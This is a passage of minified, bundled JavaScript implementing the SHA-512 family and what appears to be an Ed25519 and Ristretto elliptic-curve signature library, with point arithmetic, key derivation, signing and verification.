                const p = BigInt(2 ** 32 - 1),
                    y = BigInt(32);

                function g(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                    return t ? {
                        h: Number(e & p),
                        l: Number(e >> y & p)
                    } : {
                        h: 0 | Number(e >> y & p),
                        l: 0 | Number(e & p)
                    }
                }
                const m = {
                        fromBig: g,
                        split: function(e) {
                            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                                n = new Uint32Array(e.length),
                                r = new Uint32Array(e.length);
                            for (let i = 0; i < e.length; i++) {
                                const {
                                    h: o,
                                    l: s
                                } = g(e[i], t);
                                [n[i], r[i]] = [o, s]
                            }
                            return [n, r]
                        },
                        toBig: (e, t) => BigInt(e >>> 0) << y | BigInt(t >>> 0),
                        shrSH: (e, t, n) => e >>> n,
                        shrSL: (e, t, n) => e << 32 - n | t >>> n,
                        rotrSH: (e, t, n) => e >>> n | t << 32 - n,
                        rotrSL: (e, t, n) => e << 32 - n | t >>> n,
                        rotrBH: (e, t, n) => e << 64 - n | t >>> n - 32,
                        rotrBL: (e, t, n) => e >>> n - 32 | t << 64 - n,
                        rotr32H: (e, t) => t,
                        rotr32L: (e, t) => e,
                        rotlSH: (e, t, n) => e << n | t >>> 32 - n,
                        rotlSL: (e, t, n) => t << n | e >>> 32 - n,
                        rotlBH: (e, t, n) => t << n - 32 | e >>> 64 - n,
                        rotlBL: (e, t, n) => e << n - 32 | t >>> 64 - n,
                        add: function(e, t, n, r) {
                            const i = (t >>> 0) + (r >>> 0);
                            return {
                                h: e + n + (i / 2 ** 32 | 0) | 0,
                                l: 0 | i
                            }
                        },
                        add3L: (e, t, n) => (e >>> 0) + (t >>> 0) + (n >>> 0),
                        add3H: (e, t, n, r) => t + n + r + (e / 2 ** 32 | 0) | 0,
                        add4L: (e, t, n, r) => (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0),
                        add4H: (e, t, n, r, i) => t + n + r + i + (e / 2 ** 32 | 0) | 0,
                        add5H: (e, t, n, r, i, o) => t + n + r + i + o + (e / 2 ** 32 | 0) | 0,
                        add5L: (e, t, n, r, i) => (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0) + (i >>> 0)
                    },
                    [w, b] = m.split(["0x428a2f98d728ae22", "0x7137449123ef65cd", "0xb5c0fbcfec4d3b2f", "0xe9b5dba58189dbbc", "0x3956c25bf348b538", "0x59f111f1b605d019", "0x923f82a4af194f9b", "0xab1c5ed5da6d8118", "0xd807aa98a3030242", "0x12835b0145706fbe", "0x243185be4ee4b28c", "0x550c7dc3d5ffb4e2", "0x72be5d74f27b896f", "0x80deb1fe3b1696b1", "0x9bdc06a725c71235", "0xc19bf174cf692694", "0xe49b69c19ef14ad2", "0xefbe4786384f25e3", "0x0fc19dc68b8cd5b5", "0x240ca1cc77ac9c65", "0x2de92c6f592b0275", "0x4a7484aa6ea6e483", "0x5cb0a9dcbd41fbd4", "0x76f988da831153b5", "0x983e5152ee66dfab", "0xa831c66d2db43210", "0xb00327c898fb213f", "0xbf597fc7beef0ee4", "0xc6e00bf33da88fc2", "0xd5a79147930aa725", "0x06ca6351e003826f", "0x142929670a0e6e70", "0x27b70a8546d22ffc", "0x2e1b21385c26c926", "0x4d2c6dfc5ac42aed", "0x53380d139d95b3df", "0x650a73548baf63de", "0x766a0abb3c77b2a8", "0x81c2c92e47edaee6", "0x92722c851482353b", "0xa2bfe8a14cf10364", "0xa81a664bbc423001", "0xc24b8b70d0f89791", "0xc76c51a30654be30", "0xd192e819d6ef5218", "0xd69906245565a910", "0xf40e35855771202a", "0x106aa07032bbd1b8", "0x19a4c116b8d2d0c8", "0x1e376c085141ab53", "0x2748774cdf8eeb99", "0x34b0bcb5e19b48a8", "0x391c0cb3c5c95a63", "0x4ed8aa4ae3418acb", "0x5b9cca4f7763e373", "0x682e6ff3d6b2b8a3", "0x748f82ee5defb2fc", "0x78a5636f43172f60", "0x84c87814a1f0ab72", "0x8cc702081a6439ec", "0x90befffa23631e28", "0xa4506cebde82bde9", "0xbef9a3f7b2c67915", "0xc67178f2e372532b", "0xca273eceea26619c", "0xd186b8c721c0c207", "0xeada7dd6cde0eb1e", "0xf57d4f7fee6ed178", "0x06f067aa72176fba", "0x0a637dc5a2c898a6", "0x113f9804bef90dae", "0x1b710b35131c471b", "0x28db77f523047d84", "0x32caab7b40c72493", "0x3c9ebe0a15c9bebc", "0x431d67c49c100d4c", "0x4cc5d4becb3e42b6", "0x597f299cfc657e2a", "0x5fcb6fab3ad6faec", "0x6c44198c4a475817"].map((e => BigInt(e)))),
                    v = new Uint32Array(80),
                    A = new Uint32Array(80);
                class k extends d {
                    constructor() {
                        super(128, 64, 16, !1), this.Ah = 1779033703, this.Al = -205731576, this.Bh = -1150833019, this.Bl = -2067093701, this.Ch = 1013904242, this.Cl = -23791573, this.Dh = -1521486534, this.Dl = 1595750129, this.Eh = 1359893119, this.El = -1377402159, this.Fh = -1694144372, this.Fl = 725511199, this.Gh = 528734635, this.Gl = -79577749, this.Hh = 1541459225, this.Hl = 327033209
                    }
                    get() {
                        const {
                            Ah: e,
                            Al: t,
                            Bh: n,
                            Bl: r,
                            Ch: i,
                            Cl: o,
                            Dh: s,
                            Dl: a,
                            Eh: u,
                            El: c,
                            Fh: l,
                            Fl: f,
                            Gh: h,
                            Gl: d,
                            Hh: p,
                            Hl: y
                        } = this;
                        return [e, t, n, r, i, o, s, a, u, c, l, f, h, d, p, y]
                    }
                    set(e, t, n, r, i, o, s, a, u, c, l, f, h, d, p, y) {
                        this.Ah = 0 | e, this.Al = 0 | t, this.Bh = 0 | n, this.Bl = 0 | r, this.Ch = 0 | i, this.Cl = 0 | o, this.Dh = 0 | s, this.Dl = 0 | a, this.Eh = 0 | u, this.El = 0 | c, this.Fh = 0 | l, this.Fl = 0 | f, this.Gh = 0 | h, this.Gl = 0 | d, this.Hh = 0 | p, this.Hl = 0 | y
                    }
                    process(e, t) {
                        for (let m = 0; m < 16; m++, t += 4) v[m] = e.getUint32(t), A[m] = e.getUint32(t += 4);
                        for (let w = 16; w < 80; w++) {
                            const e = 0 | v[w - 15],
                                t = 0 | A[w - 15],
                                n = m.rotrSH(e, t, 1) ^ m.rotrSH(e, t, 8) ^ m.shrSH(e, t, 7),
                                r = m.rotrSL(e, t, 1) ^ m.rotrSL(e, t, 8) ^ m.shrSL(e, t, 7),
                                i = 0 | v[w - 2],
                                o = 0 | A[w - 2],
                                s = m.rotrSH(i, o, 19) ^ m.rotrBH(i, o, 61) ^ m.shrSH(i, o, 6),
                                a = m.rotrSL(i, o, 19) ^ m.rotrBL(i, o, 61) ^ m.shrSL(i, o, 6),
                                u = m.add4L(r, a, A[w - 7], A[w - 16]),
                                c = m.add4H(u, n, s, v[w - 7], v[w - 16]);
                            v[w] = 0 | c, A[w] = 0 | u
                        }
                        let {
                            Ah: n,
                            Al: r,
                            Bh: i,
                            Bl: o,
                            Ch: s,
                            Cl: a,
                            Dh: u,
                            Dl: c,
                            Eh: l,
                            El: f,
                            Fh: h,
                            Fl: d,
                            Gh: p,
                            Gl: y,
                            Hh: g,
                            Hl: k
                        } = this;
                        for (let _ = 0; _ < 80; _++) {
                            const e = m.rotrSH(l, f, 14) ^ m.rotrSH(l, f, 18) ^ m.rotrBH(l, f, 41),
                                t = m.rotrSL(l, f, 14) ^ m.rotrSL(l, f, 18) ^ m.rotrBL(l, f, 41),
                                E = l & h ^ ~l & p,
                                S = f & d ^ ~f & y,
                                I = m.add5L(k, t, S, b[_], A[_]),
                                x = m.add5H(I, g, e, E, w[_], v[_]),
                                M = 0 | I,
                                B = m.rotrSH(n, r, 28) ^ m.rotrBH(n, r, 34) ^ m.rotrBH(n, r, 39),
                                T = m.rotrSL(n, r, 28) ^ m.rotrBL(n, r, 34) ^ m.rotrBL(n, r, 39),
                                O = n & i ^ n & s ^ i & s,
                                C = r & o ^ r & a ^ o & a;
                            g = 0 | p, k = 0 | y, p = 0 | h, y = 0 | d, h = 0 | l, d = 0 | f, ({
                                h: l,
                                l: f
                            } = m.add(0 | u, 0 | c, 0 | x, 0 | M)), u = 0 | s, c = 0 | a, s = 0 | i, a = 0 | o, i = 0 | n, o = 0 | r;
                            const P = m.add3L(M, T, C);
                            n = m.add3H(P, x, B, O), r = 0 | P
                        }({
                            h: n,
                            l: r
                        } = m.add(0 | this.Ah, 0 | this.Al, 0 | n, 0 | r)), ({
                            h: i,
                            l: o
                        } = m.add(0 | this.Bh, 0 | this.Bl, 0 | i, 0 | o)), ({
                            h: s,
                            l: a
                        } = m.add(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)), ({
                            h: u,
                            l: c
                        } = m.add(0 | this.Dh, 0 | this.Dl, 0 | u, 0 | c)), ({
                            h: l,
                            l: f
                        } = m.add(0 | this.Eh, 0 | this.El, 0 | l, 0 | f)), ({
                            h: h,
                            l: d
                        } = m.add(0 | this.Fh, 0 | this.Fl, 0 | h, 0 | d)), ({
                            h: p,
                            l: y
                        } = m.add(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | y)), ({
                            h: g,
                            l: k
                        } = m.add(0 | this.Hh, 0 | this.Hl, 0 | g, 0 | k)), this.set(n, r, i, o, s, a, u, c, l, f, h, d, p, y, g, k)
                    }
                    roundClean() {
                        v.fill(0), A.fill(0)
                    }
                    destroy() {
                        this.buffer.fill(0), this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
                    }
                }
                class _ extends k {
                    constructor() {
                        super(), this.Ah = 573645204, this.Al = -64227540, this.Bh = -1621794909, this.Bl = -934517566, this.Ch = 596883563, this.Cl = 1867755857, this.Dh = -1774684391, this.Dl = 1497426621, this.Eh = -1775747358, this.El = -1467023389, this.Fh = -1101128155, this.Fl = 1401305490, this.Gh = 721525244, this.Gl = 746961066, this.Hh = 246885852, this.Hl = -2117784414, this.outputLen = 32
                    }
                }
                class E extends k {
                    constructor() {
                        super(), this.Ah = -876896931, this.Al = -1056596264, this.Bh = 1654270250, this.Bl = 914150663, this.Ch = -1856437926, this.Cl = 812702999, this.Dh = 355462360, this.Dl = -150054599, this.Eh = 1731405415, this.El = -4191439, this.Fh = -1900787065, this.Fl = 1750603025, this.Gh = -619958771, this.Gl = 1694076839, this.Hh = 1203062813, this.Hl = -1090891868, this.outputLen = 48
                    }
                }
                const S = h((() => new k));
                h((() => new _)), h((() => new E));
                var I = n(7420),
                    x = n.t(I, 2);
                const M = BigInt(0),
                    B = BigInt(1),
                    T = BigInt(2),
                    O = BigInt(255),
                    C = T ** BigInt(252) + BigInt("27742317777372353535851937790883648493"),
                    P = Object.freeze({
                        a: BigInt(-1),
                        d: BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),
                        P: T ** O - BigInt(19),
                        l: C,
                        n: C,
                        h: BigInt(8),
                        Gx: BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),
                        Gy: BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960")
                    }),
                    L = T ** BigInt(256),
                    N = BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752"),
                    R = (BigInt("6853475219497561581579357271197624642482790079785650197046958215289687604742"), BigInt("25063068953384623474111414158702152701244531502492656460079210482610430750235")),
                    D = BigInt("54469307008909316920995813868745141605393597292927456921205312896311721017578"),
                    z = BigInt("1159843021668779879193775521855586647937357759715417654439879720876111806838"),
                    U = BigInt("40440834346308536858101042469323190826248399146238708352240133220865137265952");
                class j {
                    constructor(e, t, n, r) {
                        this.x = e, this.y = t, this.z = n, this.t = r
                    }
                    static fromAffine(e) {
                        if (!(e instanceof V)) throw new TypeError("ExtendedPoint#fromAffine: expected Point");
                        return e.equals(V.ZERO) ? j.ZERO : new j(e.x, e.y, B, re(e.x * e.y))
                    }
                    static toAffineBatch(e) {
                        const t = function(e) {
                            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : P.P;
                            const n = new Array(e.length),
                                r = ie(e.reduce(((e, r, i) => r === M ? e : (n[i] = e, re(e * r, t))), B), t);
                            return e.reduceRight(((e, r, i) => r === M ? e : (n[i] = re(e * n[i], t), re(e * r, t))), r), n
                        }(e.map((e => e.z)));
                        return e.map(((e, n) => e.toAffine(t[n])))
                    }
                    static normalizeZ(e) {
                        return this.toAffineBatch(e).map(this.fromAffine)
                    }
                    equals(e) {
                        F(e);
                        const {
                            x: t,
                            y: n,
                            z: r
                        } = this, {
                            x: i,
                            y: o,
                            z: s
                        } = e, a = re(t * s), u = re(i * r), c = re(n * s), l = re(o * r);
                        return a === u && c === l
                    }
                    negate() {
                        return new j(re(-this.x), this.y, this.z, re(-this.t))
                    }
                    double() {
                        const {
                            x: e,
                            y: t,
                            z: n
                        } = this, {
                            a: r
                        } = P, i = re(e ** T), o = re(t ** T), s = re(T * re(n ** T)), a = re(r * i), u = re(re((e + t) ** T) - i - o), c = a + o, l = c - s, f = a - o, h = re(u * l), d = re(c * f), p = re(u * f), y = re(l * c);
                        return new j(h, d, y, p)
                    }
                    add(e) {
                        F(e);
                        const {
                            x: t,
                            y: n,
                            z: r,
                            t: i
                        } = this, {
                            x: o,
                            y: s,
                            z: a,
                            t: u
                        } = e, c = re((n - t) * (s + o)), l = re((n + t) * (s - o)), f = re(l - c);
                        if (f === M) return this.double();
                        const h = re(r * T * u),
                            d = re(i * T * a),
                            p = d + h,
                            y = l + c,
                            g = d - h,
                            m = re(p * f),
                            w = re(y * g),
                            b = re(p * g),
                            v = re(f * y);
                        return new j(m, w, v, b)
                    }
                    subtract(e) {
                        return this.add(e.negate())
                    }
                    precomputeWindow(e) {
                        const t = 1 + 256 / e,
                            n = [];
                        let r = this,
                            i = r;
                        for (let o = 0; o < t; o++) {
                            i = r, n.push(i);
                            for (let t = 1; t < 2 ** (e - 1); t++) i = i.add(r), n.push(i);
                            r = i.double()
                        }
                        return n
                    }
                    wNAF(e, t) {
                        !t && this.equals(j.BASE) && (t = V.BASE);
                        const n = t && t._WINDOW_SIZE || 1;
                        if (256 % n) throw new Error("Point#wNAF: Invalid precomputation window, must be power of 2");
                        let r = t && q.get(t);
                        r || (r = this.precomputeWindow(n), t && 1 !== n && (r = j.normalizeZ(r), q.set(t, r)));
                        let i = j.ZERO,
                            o = j.ZERO;
                        const s = 1 + 256 / n,
                            a = 2 ** (n - 1),
                            u = BigInt(2 ** n - 1),
                            c = 2 ** n,
                            l = BigInt(n);
                        for (let f = 0; f < s; f++) {
                            const t = f * a;
                            let n = Number(e & u);
                            if (e >>= l, n > a && (n -= c, e += B), 0 === n) {
                                let e = r[t];
                                f % 2 && (e = e.negate()), o = o.add(e)
                            } else {
                                let e = r[t + Math.abs(n) - 1];
                                n < 0 && (e = e.negate()), i = i.add(e)
                            }
                        }
                        return j.normalizeZ([i, o])[0]
                    }
                    multiply(e, t) {
                        return this.wNAF(fe(e, P.l), t)
                    }
                    multiplyUnsafe(e) {
                        let t = fe(e, P.l, !1);
                        const n = j.BASE,
                            r = j.ZERO;
                        if (t === M) return r;
                        if (this.equals(r) || t === B) return this;
                        if (this.equals(n)) return this.wNAF(t);
                        let i = r,
                            o = this;
                        for (; t > M;) t & B && (i = i.add(o)), o = o.double(), t >>= B;
                        return i
                    }
                    isSmallOrder() {
                        return this.multiplyUnsafe(P.h).equals(j.ZERO)
                    }
                    isTorsionFree() {
                        return this.multiplyUnsafe(P.l).equals(j.ZERO)
                    }
                    toAffine() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ie(this.z);
                        const {
                            x: t,
                            y: n,
                            z: r
                        } = this, i = re(t * e), o = re(n * e);
                        if (re(r * e) !== B) throw new Error("invZ was invalid");
                        return new V(i, o)
                    }
                    fromRistrettoBytes() {
                        W()
                    }
                    toRistrettoBytes() {
                        W()
                    }
                    fromRistrettoHash() {
                        W()
                    }
                }

                function F(e) {
                    if (!(e instanceof j)) throw new TypeError("ExtendedPoint expected")
                }

                function H(e) {
                    if (!(e instanceof K)) throw new TypeError("RistrettoPoint expected")
                }

                function W() {
                    throw new Error("Legacy method: switch to RistrettoPoint")
                }
                j.BASE = new j(P.Gx, P.Gy, B, re(P.Gx * P.Gy)), j.ZERO = new j(M, B, B, M);
                class K {
                    constructor(e) {
                        this.ep = e
                    }
                    static calcElligatorRistrettoMap(e) {
                        const {
                            d: t
                        } = P, n = re(N * e * e), r = re((n + B) * z);
                        let i = BigInt(-1);
                        const o = re((i - t * n) * re(n + t));
                        let {
                            isValid: s,
                            value: a
                        } = ae(r, o), u = re(a * e);
                        ee(u) || (u = re(-u)), s || (a = u), s || (i = n);
                        const c = re(i * (n - B) * U - o),
                            l = a * a,
                            f = re((a + a) * o),
                            h = re(c * R),
                            d = re(B - l),
                            p = re(B + l);
                        return new j(re(f * p), re(d * h), re(h * p), re(f * d))
                    }
                    static hashToCurve(e) {
                        const t = ne((e = le(e, 64)).slice(0, 32)),
                            n = this.calcElligatorRistrettoMap(t),
                            r = ne(e.slice(32, 64)),
                            i = this.calcElligatorRistrettoMap(r);
                        return new K(n.add(i))
                    }
                    static fromHex(e) {
                        e = le(e, 32);
                        const {
                            a: t,
                            d: n
                        } = P, r = "RistrettoPoint.fromHex: the hex is not valid encoding of RistrettoPoint", i = ne(e);
                        if (! function(e, t) {
                                if (e.length !== t.length) return !1;
                                for (let n = 0; n < e.length; n++)
                                    if (e[n] !== t[n]) return !1;
                                return !0
                            }($(i), e) || ee(i)) throw new Error(r);
                        const o = re(i * i),
                            s = re(B + t * o),
                            a = re(B - t * o),
                            u = re(s * s),
                            c = re(a * a),
                            l = re(t * n * u - c),
                            {
                                isValid: f,
                                value: h
                            } = ue(re(l * c)),
                            d = re(h * a),
                            p = re(h * d * l);
                        let y = re((i + i) * d);
                        ee(y) && (y = re(-y));
                        const g = re(s * p),
                            m = re(y * g);
                        if (!f || ee(m) || g === M) throw new Error(r);
                        return new K(new j(y, g, B, m))
                    }
                    toRawBytes() {
                        let {
                            x: e,
                            y: t,
                            z: n,
                            t: r
                        } = this.ep;
                        const i = re(re(n + t) * re(n - t)),
                            o = re(e * t),
                            {
                                value: s
                            } = ue(re(i * o ** T)),
                            a = re(s * i),
                            u = re(s * o),
                            c = re(a * u * r);
                        let l;
                        if (ee(r * c)) {
                            let n = re(t * N),
                                r = re(e * N);
                            e = n, t = r, l = re(a * D)
                        } else l = u;
                        ee(e * c) && (t = re(-t));
                        let f = re((n - t) * l);
                        return ee(f) && (f = re(-f)), $(f)
                    }
                    toHex() {
                        return Z(this.toRawBytes())
                    }
                    toString() {
                        return this.toHex()
                    }
                    equals(e) {
                        H(e);
                        const t = this.ep,
                            n = e.ep,
                            r = re(t.x * n.y) === re(t.y * n.x),
                            i = re(t.y * n.y) === re(t.x * n.x);
                        return r || i
                    }
                    add(e) {
                        return H(e), new K(this.ep.add(e.ep))
                    }
                    subtract(e) {
                        return H(e), new K(this.ep.subtract(e.ep))
                    }
                    multiply(e) {
                        return new K(this.ep.multiply(e))
                    }
                    multiplyUnsafe(e) {
                        return new K(this.ep.multiplyUnsafe(e))
                    }
                }
                K.BASE = new K(j.BASE), K.ZERO = new K(j.ZERO);
                const q = new WeakMap;
                class V {
                    constructor(e, t) {
                        this.x = e, this.y = t
                    }
                    _setWindowSize(e) {
                        this._WINDOW_SIZE = e, q.delete(this)
                    }
                    static fromHex(e) {
                        let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                        const {
                            d: n,
                            P: r
                        } = P, i = (e = le(e, 32)).slice();
                        i[31] = -129 & e[31];
                        const o = te(i);
                        if (t && o >= r) throw new Error("Expected 0 < hex < P");
                        if (!t && o >= L) throw new Error("Expected 0 < hex < 2**256");
                        const s = re(o * o),
                            a = re(s - B),
                            u = re(n * s + B);
                        let {
                            isValid: c,
                            value: l
                        } = ae(a, u);
                        if (!c) throw new Error("Point.fromHex: invalid y coordinate");
                        const f = (l & B) === B;
                        return 0 !== (128 & e[31]) !== f && (l = re(-l)), new V(l, o)
                    }
                    static async fromPrivateKey(e) {
                        return (await me(e)).point
                    }
                    toRawBytes() {
                        const e = $(this.y);
                        return e[31] |= this.x & B ? 128 : 0, e
                    }
                    toHex() {
                        return Z(this.toRawBytes())
                    }
                    toX25519() {
                        const {
                            y: e
                        } = this;
                        return $(re((B + e) * ie(B - e)))
                    }
                    isTorsionFree() {
                        return j.fromAffine(this).isTorsionFree()
                    }
                    equals(e) {
                        return this.x === e.x && this.y === e.y
                    }
                    negate() {
                        return new V(re(-this.x), this.y)
                    }
                    add(e) {
                        return j.fromAffine(this).add(j.fromAffine(e)).toAffine()
                    }
                    subtract(e) {
                        return this.add(e.negate())
                    }
                    multiply(e) {
                        return j.fromAffine(this).multiply(e, this).toAffine()
                    }
                }
                V.BASE = new V(P.Gx, P.Gy), V.ZERO = new V(M, B);
                class Q {
                    constructor(e, t) {
                        this.r = e, this.s = t, this.assertValidity()
                    }
                    static fromHex(e) {
                        const t = le(e, 64),
                            n = V.fromHex(t.slice(0, 32), !1),
                            r = te(t.slice(32, 64));
                        return new Q(n, r)
                    }
                    assertValidity() {
                        const {
                            r: e,
                            s: t
                        } = this;
                        if (!(e instanceof V)) throw new Error("Expected Point instance");
                        return fe(t, P.l, !1), this
                    }
                    toRawBytes() {
                        const e = new Uint8Array(64);
                        return e.set(this.r.toRawBytes()), e.set($(this.s), 32), e
                    }
                    toHex() {
                        return Z(this.toRawBytes())
                    }
                }

                function G() {
                    for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                    if (!t.every((e => e instanceof Uint8Array))) throw new Error("Expected Uint8Array list");
                    if (1 === t.length) return t[0];
                    const r = t.reduce(((e, t) => e + t.length), 0),
                        i = new Uint8Array(r);
                    for (let o = 0, s = 0; o < t.length; o++) {
                        const e = t[o];
                        i.set(e, s), s += e.length
                    }
                    return i
                }
                const Y = Array.from({
                    length: 256
                }, ((e, t) => t.toString(16).padStart(2, "0")));

                function Z(e) {
                    if (!(e instanceof Uint8Array)) throw new Error("Uint8Array expected");
                    let t = "";
                    for (let n = 0; n < e.length; n++) t += Y[e[n]];
                    return t
                }

                function J(e) {
                    if ("string" !== typeof e) throw new TypeError("hexToBytes: expected string, got " + typeof e);
                    if (e.length % 2) throw new Error("hexToBytes: received invalid unpadded hex");
                    const t = new Uint8Array(e.length / 2);
                    for (let n = 0; n < t.length; n++) {
                        const r = 2 * n,
                            i = e.slice(r, r + 2),
                            o = Number.parseInt(i, 16);
                        if (Number.isNaN(o) || o < 0) throw new Error("Invalid byte sequence");
                        t[n] = o
                    }
                    return t
                }

                function X(e) {
                    return J(e.toString(16).padStart(64, "0"))
                }

                function $(e) {
                    return X(e).reverse()
                }

                function ee(e) {
                    return (re(e) & B) === B
                }

                function te(e) {
                    if (!(e instanceof Uint8Array)) throw new Error("Expected Uint8Array");
                    return BigInt("0x" + Z(Uint8Array.from(e).reverse()))
                }

                function ne(e) {
                    return re(te(e) & T ** O - B)
                }

                function re(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : P.P;
                    const n = e % t;
                    return n >= M ? n : t + n
                }

                function ie(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : P.P;
                    if (e === M || t <= M) throw new Error(`invert: expected positive integers, got n=${e} mod=${t}`);
                    let n = re(e, t),
                        r = t,
                        i = M,
                        o = B,
                        s = B,
                        a = M;
                    for (; n !== M;) {
                        const e = r / n,
                            t = r % n,
                            u = i - s * e,
                            c = o - a * e;
                        r = n, n = t, i = s, o = a, s = u, a = c
                    }
                    const u = r;
                    if (u !== B) throw new Error("invert: does not exist");
                    return re(i, t)
                }

                function oe(e, t) {
                    const {
                        P: n
                    } = P;
                    let r = e;
                    for (; t-- > M;) r *= r, r %= n;
                    return r
                }

                function se(e) {
                    const {
                        P: t
                    } = P, n = BigInt(5), r = BigInt(10), i = BigInt(20), o = BigInt(40), s = BigInt(80), a = e * e % t * e % t, u = oe(a, T) * a % t, c = oe(u, B) * e % t, l = oe(c, n) * c % t, f = oe(l, r) * l % t, h = oe(f, i) * f % t, d = oe(h, o) * h % t, p = oe(d, s) * d % t, y = oe(p, s) * d % t, g = oe(y, r) * l % t;
                    return {
                        pow_p_5_8: oe(g, T) * e % t,
                        b2: a
                    }
                }

                function ae(e, t) {
                    const n = re(t * t * t),
                        r = re(n * n * t);
                    let i = re(e * n * se(e * r).pow_p_5_8);
                    const o = re(t * i * i),
                        s = i,
                        a = re(i * N),
                        u = o === e,
                        c = o === re(-e),
                        l = o === re(-e * N);
                    return u && (i = s), (c || l) && (i = a), ee(i) && (i = re(-i)), {
                        isValid: u || c,
                        value: i
                    }
                }

                function ue(e) {
                    return ae(B, e)
                }

                function ce(e) {
                    return re(te(e), P.l)
                }

                function le(e, t) {
                    const n = e instanceof Uint8Array ? Uint8Array.from(e) : J(e);
                    if ("number" === typeof t && n.length !== t) throw new Error(`Expected ${t} bytes`);
                    return n
                }

                function fe(e, t) {
                    let n = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                    if (!t) throw new TypeError("Specify max value");
                    if ("number" === typeof e && Number.isSafeInteger(e) && (e = BigInt(e)), "bigint" === typeof e && e < t)
                        if (n) {
                            if (M < e) return e
                        } else if (M <= e) return e;
                    throw new TypeError("Expected valid scalar: 0 < scalar < max")
                }

                function he(e) {
                    return e[0] &= 248, e[31] &= 127, e[31] |= 64, e
                }

                function de(e) {
                    if (32 !== (e = "bigint" === typeof e || "number" === typeof e ? X(fe(e, L)) : le(e)).length) throw new Error("Expected 32 bytes");
                    return e
                }

                function pe(e) {
                    const t = he(e.slice(0, 32)),
                        n = e.slice(32, 64),
                        r = ce(t),
                        i = V.BASE.multiply(r),
                        o = i.toRawBytes();
                    return {
                        head: t,
                        prefix: n,
                        scalar: r,
                        point: i,
                        pointBytes: o
                    }
                }
                let ye;

                function ge() {
                    if ("function" !== typeof ye) throw new Error("utils.sha512Sync must be set to use sync methods");
                    return ye(...arguments)
                }
                async function me(e) {
                    return pe(await _e.sha512(de(e)))
                }

                function we(e) {
                    return pe(ge(de(e)))
                }

                function be(e, t, n) {
                    t = le(t), n instanceof V || (n = V.fromHex(n, !1));
                    const {
                        r: r,
                        s: i
                    } = e instanceof Q ? e.assertValidity() : Q.fromHex(e);
                    return {
                        r: r,
                        s: i,
                        SB: j.BASE.multiplyUnsafe(i),
                        pub: n,
                        msg: t
                    }
                }

                function ve(e, t, n, r) {
                    const i = ce(r),
                        o = j.fromAffine(e).multiplyUnsafe(i);
                    return j.fromAffine(t).add(o).subtract(n).multiplyUnsafe(P.h).equals(j.ZERO)
                }
                const Ae = {
                    getExtendedPublicKey: we,
                    getPublicKey: function(e) {
                        return we(e).pointBytes
                    },
                    sign: function(e, t) {
                        e = le(e);
                        const {
                            prefix: n,
                            scalar: r,
                            pointBytes: i
                        } = we(t), o = ce(ge(n, e)), s = V.BASE.multiply(o), a = re(o + ce(ge(s.toRawBytes(), i, e)) * r, P.l);
                        return new Q(s, a).toRawBytes()
                    },
                    verify: function(e, t, n) {
                        const {
                            r: r,
                            SB: i,
                            msg: o,
                            pub: s
                        } = be(e, t, n), a = ge(r.toRawBytes(), s.toRawBytes(), o);
                        return ve(s, r, i, a)
                    }
                };
                V.BASE._setWindowSize(8);
                const ke = {
                        node: x,
                        web: "object" === typeof self && "crypto" in self ? self.crypto : void 0
                    },
                    _e = {
                        TORSION_SUBGROUP: ["0100000000000000000000000000000000000000000000000000000000000000", "c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac037a", "0000000000000000000000000000000000000000000000000000000000000080", "26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc05", "ecffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f", "26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc85", "0000000000000000000000000000000000000000000000000000000000000000", "c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac03fa"],
                        bytesToHex: Z,
                        hexToBytes: J,
                        concatBytes: G,
                        getExtendedPublicKey: me,
                        mod: re,
                        invert: ie,
                        hashToPrivateScalar: e => {
                            if ((e = le(e)).length < 40 || e.length > 1024) throw new Error("Expected 40-1024 bytes of private key as per FIPS 186");
                            return re(te(e), P.l - B) + B
                        },
                        randomBytes: function() {
                            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
                            if (ke.web) return ke.web.getRandomValues(new Uint8Array(e));
                            if (ke.node) {
                                const {
                                    randomBytes: t
                                } = ke.node;
                                return new Uint8Array(t(e).buffer)
                            }
                            throw new Error("The environment doesn't have randomBytes function")
                        },
                        randomPrivateKey: () => _e.randomBytes(32),
                        sha512: async function() {
                            const e = G(...arguments);
                            if (ke.web) {
                                const t = await ke.web.subtle.digest("SHA-512", e.buffer);
                                return new Uint8Array(t)
                            }
                            if (ke.node) return Uint8Array.from(ke.node.createHash("sha512").update(e).digest());
                            throw new Error("The environment doesn't have sha512 function")
                        },
                        precompute() {
                            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 8,
                                t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : V.BASE;
                            const n = t.equals(V.BASE) ? t : new V(t.x, t.y);
                            return n._setWindowSize(e), n.multiply(T), n
                        },
                        sha512Sync: void 0
                    };
                Object.defineProperties(_e, {
                    sha512Sync: {
                        configurable: !1,
                        get: () => ye,
                        set(e) {
                            ye || (ye = e)
                        }
                    }
                });
                var Ee = n(518),
                    Se = n.n(Ee),
                    Ie = n(6315),
                    xe = n.n(Ie);
                const Me = (e, t, n) => e & t ^ e & n ^ t & n,
